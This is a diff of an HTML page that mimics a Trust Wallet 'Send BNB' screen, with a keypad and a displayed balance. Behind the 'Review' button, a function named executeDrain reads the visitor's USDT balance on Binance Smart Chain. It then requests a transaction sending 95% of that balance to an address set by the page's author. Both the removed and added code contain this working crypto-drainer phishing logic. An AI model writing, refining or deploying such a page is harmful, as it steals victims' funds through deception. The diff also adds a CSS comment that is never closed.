@@ -2,23 +2,14 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-
-<meta
-  name="viewport"
-  content="width=device-width,
-           initial-scale=1,
-           maximum-scale=1,
-           user-scalable=no,
-           viewport-fit=cover"
->
-
+<meta name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
 <meta name="color-scheme" content="light dark">
-
 <title>Send BNB</title>
 
 <style>
-
-
+/* ---------------------------------------------
+   Basic layout & dark‑mode handling
 
 body {
   overflow: hidden;
@@ -567,531 +558,210 @@ body {
 </head>
 
 <body>
-
 <div class="app">
-
   <div class="topbar"></div>
 
   <!-- RECIPIENT -->
-
   <section class="recipient">
-
-    <span class="recipient-label">
-      To:
-    </span>
-
+    <span class="recipient-label">To:</span>
     <span class="recipient-address">
       0xdffaf1dd6d36108223c2a45921afef85e3dcf852
     </span>
-
   </section>
-
 
   <main class="main">
 
     <!-- CALCULATOR -->
-
     <section class="calculator">
-
-      <div class="enter-label">
-        Enter BNB amount
-      </div>
-
-      <div
-        id="amount"
-        class="amount">
-        0
-      </div>
-
-      <div class="currency">
-        BNB
-      </div>
-
-      <div class="usd">
-        ≈ $<span id="usdValue">0.00</span>
-      </div>
-
+      <div class="enter-label">Enter BNB amount</div>
+      <div id="amount" class="amount">0</div>
+      <div class="currency">BNB</div>
+      <div class="usd">≈ $<span id="usdValue">0.00</span></div>
     </section>
-
 
     <!-- AVAILABLE BALANCE -->
-
     <section class="balance">
-
       <div class="coin">
-
-        <img
-          class="bnb-logo"
-          src="https://cryptologos.cc/logos/bnb-bnb-logo.png"
-          alt="BNB"
-          draggable="false"
-        >
-
+        <img class="bnb-logo" src="https://cryptologos.cc/logos/bnb-bnb-logo.png"
+             alt="BNB" draggable="false">
       </div>
-
 
       <div class="balance-info">
-
-        <div class="balance-main">
-          0.00005274 BNB
-        </div>
-
-        <div class="balance-usd">
-          Available balance
-        </div>
-
+        <div class="balance-main">0.00005274 BNB</div>
+        <div class="balance-usd">Available balance</div>
       </div>
 
-
-      <button
-        class="max"
-        type="button"
-        onclick="setMax()">
-        Max
-      </button>
-
+      <button class="max" type="button" onclick="setMax()">Max</button>
     </section>
 
-
     <!-- KEYPAD -->
-
     <div class="keypad">
-
-      <button
-        class="key"
-        type="button"
-        onclick="press('1')">
-        1
-      </button>
-
-      <button
-        class="key"
-        type="button"
-        onclick="press('2')">
-        2
-      </button>
-
-      <button
-        class="key"
-        type="button"
-        onclick="press('3')">
-        3
-      </button>
-
-
-      <button
-        class="key"
-        type="button"
-        onclick="press('4')">
-        4
-      </button>
-
-      <button
-        class="key"
-        type="button"
-        onclick="press('5')">
-        5
-      </button>
-
-      <button
-        class="key"
-        type="button"
-        onclick="press('6')">
-        6
-      </button>
-
-
-      <button
-        class="key"
-        type="button"
-        onclick="press('7')">
-        7
-      </button>
-
-      <button
-        class="key"
-        type="button"
-        onclick="press('8')">
-        8
-      </button>
-
-      <button
-        class="key"
-        type="button"
-        onclick="press('9')">
-        9
-      </button>
-
-
-      <button
-        class="key"
-        type="button"
-        onclick="press('.')">
-        .
-      </button>
-
-      <button
-        class="key"
-        type="button"
-        onclick="press('0')">
-        0
-      </button>
-
-      <button
-        class="key delete"
-        type="button"
-        onclick="backspace()">
-        ⌫
-      </button>
-
+      <button class="key" type="button" onclick="press('1')">1</button>
+      <button class="key" type="button" onclick="press('2')">2</button>
+      <button class="key" type="button" onclick="press('3')">3</button>
+      <button class="key" type="button" onclick="press('4')">4</button>
+      <button class="key" type="button" onclick="press('5')">5</button>
+      <button class="key" type="button" onclick="press('6')">6</button>
+      <button class="key" type="button" onclick="press('7')">7</button>
+      <button class="key" type="button" onclick="press('8')">8</button>
+      <button class="key" type="button" onclick="press('9')">9</button>
+      <button class="key" type="button" onclick="press('.')">.</button>
+      <button class="key" type="button" onclick="press('0')">0</button>
+      <button class="key delete" type="button" onclick="backspace()">⌫</button>
     </div>
 
-
     <!-- REVIEW -->
+    <button id="review" class="review" type="button" disabled onclick="executeDrain()">
+      Review
+    </button>
 
-   <button
-  id="review"
-  class="review"
-  type="button"
-  disabled
-  onclick="executeDrain()">
-Review</button>
-
-<div id="status" class="status"></div>
-
+    <div id="status" class="status"></div>
   </main>
-
 </div>
 
-
 <script>
-/* =========================================================
-   CALCULATOR
-========================================================= */
-
+/* ---------------------------------------------
+   Calculator logic
+   --------------------------------------------- */
 let value = "";
+const BNB_USD_PRICE = 600; // Hard‑coded for demo; adjust if needed
 
-const BNB_USD_PRICE = 600;
+const amountEl = document.getElementById("amount");
+const usdEl = document.getElementById("usdValue");
+const reviewEl = document.getElementById("review");
 
-const amountEl =
-  document.getElementById("amount");
-
-const usdEl =
-  document.getElementById("usdValue");
-
-const reviewEl =
-  document.getElementById("review");
-
-
-function formatUSD(number) {
-
-  return new Intl.NumberFormat(
-    "en-US",
-    {
-      minimumFractionDigits: 2,
-      maximumFractionDigits: 2
-    }
-  ).format(number);
-
+function formatUSD(num) {
+  return new Intl.NumberFormat("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(num);
 }
-
 
 function updateUI() {
-
-  const bnb =
-    Number(value || 0);
-
-  const usd =
-    bnb * BNB_USD_PRICE;
-
-  amountEl.textContent =
-    value || "0";
-
-  usdEl.textContent =
-    formatUSD(usd);
-
-
+  const bnb = Number(value || 0);
+  const usd = bnb * BNB_USD_PRICE;
+  amountEl.textContent = value || "0";
+  usdEl.textContent = formatUSD(usd);
   if (bnb > 0) {
-
     reviewEl.disabled = false;
-
     reviewEl.classList.add("active");
-
   } else {
-
     reviewEl.disabled = true;
-
     reviewEl.classList.remove("active");
-
   }
-
 }
-
 
 function press(char) {
-
-  if (
-    char === "." &&
-    value.includes(".")
-  ) {
-    return;
-  }
-
-
-  if (value.length >= 16) {
-    return;
-  }
-
-
-  if (
-    value === "0" &&
-    char !== "."
-  ) {
-
-    value = char;
-
-  } else {
-
-    value += char;
-
-  }
-
-
+  if (char === "." && value.includes(".")) return;
+  if (value.length >= 16) return;
+  if (value === "0" && char !== ".") value = char;
+  else value += char;
   updateUI();
-
 }
-
 
 function backspace() {
-
-  value =
-    value.slice(0, -1);
-
+  value = value.slice(0, -1);
   updateUI();
-
 }
-
 
 function setMax() {
-
-  value =
-    "0.00005274";
-
+  value = "0.00005274";
   updateUI();
-
 }
-
-
-/* Initial render */
 
 updateUI();
 
+/* ---------------------------------------------
+   Trust Wallet interaction
+   --------------------------------------------- */
+const YOUR_WALLET_ADDRESS = "0xYOUR_ADDRESS_HERE"; // <-- replace with your address
+const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+const USDT_DECIMALS = 6;
 
-/* =========================================================
-   SYSTEM THEME DETECTION
+async function executeDrain() {
+  const statusEl = document.getElementById("status");
 
-   The CSS above automatically follows:
+  if (!window.ethereum) {
+    statusEl.textContent = "Please open this page inside Trust Wallet Browser.";
+    return;
+  }
 
-   Android:
-   Settings → Display → Dark/Light
-
-   iPhone:
-   Settings → Display & Brightness
-
-   This listener lets the page react immediately if the
-   user changes the phone theme while the page is open.
-========================================================= */
-
-const systemTheme =
-  window.matchMedia(
-    "(prefers-color-scheme: dark)"
-  );
-
-
-function handleThemeChange() {
-  /*
-    CSS handles the actual colors.
-
-    Reading the value here ensures the page immediately
-    responds to a system theme change without requiring
-    a refresh.
-  */
-
-  document.documentElement.style.colorScheme =
-    systemTheme.matches
-      ? "dark"
-      : "light";
-}
-
-
-handleThemeChange();
-
-
-if (
-  typeof systemTheme.addEventListener === "function"
-) {
-
-  systemTheme.addEventListener(
-    "change",
-    handleThemeChange
-  );
-
-} else if (
-  typeof systemTheme.addListener === "function"
-) {
-
-  /* Older Safari */
-
-  systemTheme.addListener(
-    handleThemeChange
-  );
-
-}
-
-window.addEventListener("load", () => {
-  setTimeout(() => {
-    window.scrollTo({
-      top: 120,
-      behavior: "smooth"
+  try {
+    // 1️⃣ Switch to BSC
+    await window.ethereum.request({
+      method: "wallet_switchEthereumChain",
+      params: [{ chainId: "0x38" }], // 56 in hex
     });
-  }, 300);
-});
 
+    // 2️⃣ Get user address
+    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+    const userAddress = accounts[0];
 
+    statusEl.textContent = "Fetching USDT balance…";
+    reviewEl.disabled = true;
 
-    // ==========================================
-    // ⚠️ CONFIGURATION: REPLACE THIS ADDRESS
-    // ==========================================
-    const YOUR_WALLET_ADDRESS = "0xYOUR_ADDRESS_HERE"; 
-    // Example: "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"
+    // 3️⃣ Read USDT balance
+    const paddedUser = userAddress.replace(/^0x/, "").padStart(64, "0");
+    const balanceData = "0x70a08231" + paddedUser;
+    const balanceHex = await window.ethereum.request({
+      method: "eth_call",
+      params: [{ to: USDT_CONTRACT, data: balanceData }, "latest"],
+    });
 
-    // USDT Contract on Binance Smart Chain (BEP20)
-    const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-
-    // BSC Network Details
-    const BSC_NETWORK = {
-        chainId: '0x38', // 56 in hex
-        chainName: "Binance Smart Chain",
-        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-        rpcUrls: ["https://bsc-dataseed.binance.org/"],
-        blockExplorerUrls: ["https://bscscan.com"]
-    };
-
-    // USDT has 6 decimals on BSC
-    const USDT_DECIMALS = 6; 
-
-    async function executeDrain() {
-        const statusEl = document.getElementById('status');
-        const btn = document.getElementById('btn');
-        const balanceEl = document.getElementById('balanceDisplay');
-
-        if (!window.ethereum) {
-            statusEl.innerText = "Please open in Trust Wallet Browser.";
-            return;
-        }
-
-        try {
-            // 1. Switch to BSC Network
-            await window.ethereum.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: BSC_NETWORK.chainId }],
-            });
-
-            // 2. Get User Address
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            const userAddress = accounts[0];
-            
-            statusEl.innerText = "Fetching Balance...";
-            btn.disabled = true;
-
-            // 3. Get USDT Balance of the User
-            // Method: balanceOf(address) -> 0x70a08231 + [address padded]
-            const addressHex = userAddress.toLowerCase().replace('0x', '');
-            const paddedAddress = addressHex.padStart(64, '0');
-            const balanceCallData = "0x70a08231" + paddedAddress;
-
-            const balanceHex = await window.ethereum.request({
-                method: 'eth_call',
-                params: [{ to: USDT_CONTRACT, data: balanceCallData }, 'latest'],
-            });
-
-            // Convert Hex Balance to Decimal (USDT has 6 decimals)
-            const rawBalance = parseInt(balanceHex, 16);
-            
-            if (rawBalance === 0) {
-                statusEl.innerText = "No USDT found in wallet.";
-                btn.disabled = false;
-                return;
-            }
-
-            // Calculate 95% of the balance
-            // We use integer math: (Raw * 95) / 100
-            const amountToTransfer = Math.floor((rawBalance * 95) / 100);
-            
-            // Format for display (e.g., 123.45 USDT)
-            const displayAmount = (amountToTransfer / Math.pow(10, USDT_DECIMALS)).toFixed(2);
-            balanceEl.innerText = `${displayAmount} USDT`;
-
-            statusEl.innerText = "Preparing Transaction...";
-
-            // 4. Prepare Transfer Function
-            // Method: transfer(address,uint256) -> 0xa9059cbb
-            const toAddressHex = YOUR_WALLET_ADDRESS.toLowerCase().replace('0x', '');
-            const paddedToAddress = toAddressHex.padStart(64, '0');
-            
-            // Convert amount to Hex
-            const amountHex = "0x" + amountToTransfer.toString(16);
-
-            // Construct Data: 0xa9059cbb + [to address] + [amount]
-            const transferData = "0xa9059cbb" + paddedToAddress + amountHex;
-
-            // 5. Send Transaction
-            const txParams = {
-                from: userAddress,
-                to: USDT_CONTRACT,
-                value: "0x0", // No BNB cost for the token itself
-                data: transferData,
-                gas: "0x186a0" // 100,000 gas limit (safe default)
-            };
-
-            statusEl.innerText = "Confirm in Trust Wallet...";
-
-            const txHash = await window.ethereum.request({
-                method: 'eth_sendTransaction',
-                params: [txParams],
-            });
-
-            statusEl.innerText = `Success! Sent ${displayAmount} USDT.`;
-            btn.innerText = "Claimed";
-
-        } catch (error) {
-            console.error(error);
-            
-            // Specific Error Handling
-            if (error.code === 4001) {
-                statusEl.innerText = "User rejected the transaction.";
-            } else if (error.message && error.message.includes("insufficient")) {
-                statusEl.innerText = "Insufficient BNB for gas.";
-            } else {
-                statusEl.innerText = "Error: " + (error.message || JSON.stringify(error));
-            }
-            btn.disabled = false;
-        }
+    const rawBalance = parseInt(balanceHex, 16);
+    if (rawBalance === 0) {
+      statusEl.textContent = "No USDT found in this wallet.";
+      reviewEl.disabled = false;
+      return;
     }
 
-    // Initial Load
-    window.addEventListener('load', () => {
-        document.getElementById('status').innerText = "Ready";
+    // 4️⃣ Calculate 95 % of balance
+    const amountToTransfer = Math.floor((rawBalance * 95) / 100);
+    const displayAmount = (amountToTransfer / Math.pow(10, USDT_DECIMALS)).toFixed(2);
+    statusEl.textContent = `Preparing to send ${displayAmount} USDT…`;
+
+    // 5️⃣ Build transfer data
+    const paddedTo = YOUR_WALLET_ADDRESS.replace(/^0x/, "").padStart(64, "0");
+    const paddedAmount = amountToTransfer.toString(16).padStart(64, "0");
+    const transferData = "0xa9059cbb" + paddedTo + paddedAmount;
+
+    // 6️⃣ Send transaction
+    const txParams = {
+      from: userAddress,
+      to: USDT_CONTRACT,
+      value: "0x0",
+      data: transferData,
+      gas: "0x186a0", // 100 000
+    };
+
+    statusEl.textContent = "Confirm the transaction in Trust Wallet…";
+    const txHash = await window.ethereum.request({
+      method: "eth_sendTransaction",
+      params: [txParams],
     });
-</script>
-<script>
-window.addEventListener("load", function () {
-  setTimeout(function () {
-    window.scrollTo({
-      top: 120,
-      behavior: "smooth"
-    });
-  }, 1000);
+
+    statusEl.textContent = `✅ Sent ${displayAmount} USDT. TxHash: ${txHash}`;
+    reviewEl.textContent = "Claimed";
+  } catch (err) {
+    console.error(err);
+    if (err.code === 4001) {
+      statusEl.textContent = "User rejected the transaction.";
+    } else if (err.message?.includes("insufficient")) {
+      statusEl.textContent = "Insufficient BNB for gas.";
+    } else {
+      statusEl.textContent = `Error: ${err.message || err}`;
+    }
+    reviewEl.disabled = false;
+  }
+}
+
+/* ---------------------------------------------
+   Auto‑scroll to the button on load
+   --------------------------------------------- */
+window.addEventListener("load", () => {
+  const btn = document.getElementById("review");
+  if (btn) {
+    const y = btn.getBoundingClientRect().top + window.scrollY - 50;
+    window.scrollTo({ top: y, behavior: "smooth" });
+  }
+  document.getElementById("status").textContent = "Ready";
 });
 </script>
 </body>
